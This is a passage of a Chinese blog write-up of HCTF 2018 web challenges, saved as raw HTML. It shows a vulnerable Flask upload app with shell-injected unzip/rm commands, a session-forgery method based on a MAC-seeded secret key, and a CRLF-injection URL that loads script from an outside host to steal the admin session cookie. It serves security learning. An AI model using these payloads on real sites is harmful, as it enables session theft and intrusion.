class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure>
+<p>一开始想着直接读取flag，但是被限制了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+<p>解密登录的session可以看到，session中就存放了一个字典</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/9.png" alt></p>
+<p>猜测只要<code>username</code>字段等于<code>admin</code>就可以看到flag（读取<code>templates/index.html</code>也可以验证这一点</p>
+<p>代码里有一个很诡异的随机数播种<code>random.seed(uuid.getnode())</code></p>
+<p>利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的</p>
+<p>可以知道<code>uuid.getnode()</code>的值是当前MAC地址的十进制形式，则可以通过读取<code>/sys/class/net/eth0/address</code>来获取到MAC地址</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12<span class="selector-pseudo">:34</span><span class="selector-pseudo">:3e</span><span class="selector-pseudo">:14</span><span class="selector-pseudo">:7c</span><span class="selector-pseudo">:62</span></span><br></pre></td></tr></table></figure>
+<p>转换成十进制后为<code>20015589129314</code></p>
+<p>然后尝试在本地用python2起了这个服务，一开始怎么试都不行，一开始以为是随机数的问题</p>
+<p>后来用python3尝试了下，发现输出的随机数的精度不一样。。。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11<span class="selector-class">.935137566861131</span></span><br></pre></td></tr></table></figure>
+<p>这样，在<code>app.config[&#39;SECRET_KEY&#39;]</code>一致的时候，session则是可以伪造的，在本地登录个admin账号，然后用session的值放到比赛环境中，就可以看到flag了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/10.png" alt></p>
+<hr>
+<p>赛后复现题</p>
+<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>在排序的时候，可以选择用<code>password</code>排序</p>
+<p>这样，就可以疯狂注册账号，注册不同的密码，根据账号在<code>admin</code>的前后位置来fuzz出admin的密码</p>
+<h1 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h1><p>只有几个简单的登录注册，提交url功能。看了wp才知道bottle是个python框架，主要漏洞来自于</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></p>
+<p>一个2016年的cve漏洞，并且题目也提示了是用的firefox box，在302跳转的<code>/path</code>页面中存在一个<code>CRLF</code>http头截断</p>
+<p>漏洞重点都在p神的文章中提到了，只要将跳转的url小于80即可</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bottle.<span class="number">2018</span>.hctf.io/path<span class="built_in">?path</span>=http://bottle.<span class="number">2018</span>.hctf.io:<span class="number">22</span>/<span class="meta">%0d</span><span class="meta">%0a</span><span class="meta">%0d</span><span class="meta">%0a</span>&lt;script<span class="meta">%20src</span>=//script.kingkk.com/<span class="number">1</span>.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这样提交之后，就可以收到admin的session了，换上session之后，就可以看到flag</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/12.png" alt></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>由于是陆陆续续做的一些题，做完这些之后比赛就差不多快结束了，后面的题也就是瞟了一眼，有空还是会复现下的。感谢vidar-team一次体验极棒的比赛。</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/11/2018-lctf-web-学习篇/" data-toggle="tooltip" data-placement="top" title="2018 lctf-web 学习篇">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/11/weblogic漏洞扫描工具-weblogic-scan/" data-toggle="tooltip" data-placement="top" title="weblogic漏洞扫描工具 weblogic-scan">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                          <a class="tag" href="/tags/#hctf" title="hctf">hctf</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
